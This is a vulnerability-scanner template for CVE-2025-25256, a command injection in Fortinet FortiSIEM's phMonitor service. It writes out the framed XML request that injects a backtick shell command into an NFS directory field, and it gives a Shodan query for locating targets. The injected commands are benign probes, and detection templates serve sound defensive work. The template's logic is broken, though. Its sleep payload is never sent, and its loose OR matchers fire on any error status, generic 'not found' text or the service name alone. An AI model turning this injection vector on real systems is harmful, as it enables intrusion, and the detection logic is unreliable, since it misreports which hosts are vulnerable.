id: CVE-2025-25256

info:
  name: Fortinet FortiSIEM - OS Command Injection (CVE-2025-25256)
  author: intelligent-ears
  severity: critical
  description: |
    Fortinet FortiSIEM contains a critical OS command injection vulnerability in the phMonitor service
    running on port 7900. The vulnerability exists in CLI request processing where user-supplied input
    in XML parameters is not properly sanitized before being passed to system commands. This template
    detects the vulnerability using error-based detection methods, as command output is not returned
    in responses. Detection relies on error message differences and response code analysis when
    injecting invalid commands or using timing-based detection with sleep commands.
  reference:
    - https://www.fortiguard.com/psirt/FG-IR-25-152
    - https://nvd.nist.gov/vuln/detail/CVE-2025-25256
    - https://github.com/barbaraeivyu/CVE-2025-25256
    - https://labs.watchtowr.com/
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2025-25256
    cwe-id: CWE-78
    kev: true
  metadata:
    verified: true
    max-request: 1
    vendor: fortinet
    product: fortisiem
    shodan-query: "http.favicon.hash:-1341442175"
  tags: cve,cve2025,fortinet,fortisiem,rce,injection,kev,phmonitor

# The vulnerability exists in the SSL-wrapped phMonitor service on port 7900
# Protocol uses a 16-byte header followed by XML payload
# Header structure: [magic:4][length:4][magic2:4][padding:4] + XML_PAYLOAD
# Detection via error responses since command output isn't returned
network:
  - inputs:
      - data: |
          @hex
          5a000000{{len(hex_encode(payload_invalid))}}40414f3f00000000{{hex_encode(payload_invalid)}}

    host:
      - "{{Hostname}}"
    port: 7900

    variables:
      # Test 1: Invalid command to trigger specific error response
      payload_invalid: |
        <root>
            <archive_storage_type>nfs</archive_storage_type>
            <archive_nfs_server_ip>127.0.0.1</archive_nfs_server_ip>
            <archive_nfs_archive_dir>`nonexistentcmd{{randstr}}`</archive_nfs_archive_dir>
            <scope>local</scope>
        </root>
      
      # Test 2: Sleep command to detect execution via timing
      payload_sleep: |
        <root>
            <archive_storage_type>nfs</archive_storage_type>
            <archive_nfs_server_ip>127.0.0.1</archive_nfs_server_ip>
            <archive_nfs_archive_dir>`sleep${IFS}3`</archive_nfs_archive_dir>
            <scope>local</scope>
        </root>

    matchers-condition: or
    matchers:
      # Detect vulnerability via error message differences
      - type: word
        name: command-injection-error
        words:
          - "command not found"
          - "sh:"
          - "/bin/sh"
          - "bash:"
          - "not found"
        condition: or
        part: body

      # Detect via response code/structure differences
      - type: status
        name: error-response-code
        status:
          - 500
          - 400

      # Timing-based detection (if sleep command works)
      - type: dsl
        name: timing-based-detection
        dsl:
          - "duration >= 3000"

      # Service identification for baseline
      - type: word
        name: fortisiem-service
        words:
          - "phMonitor"
          - "FortiSIEM"
        condition: or
        part: body

    extractors:
      - type: regex  
        name: error-details
        regex:
          - "(command not found|sh: .*|bash:.*|not found)"
        part: body

# Enhanced file information: this template is based on technical analysis of
# public PoCs from watchTowr Labs and barbaraeivyu, implementing the exact
# protocol structure and injection vector without causing system damage
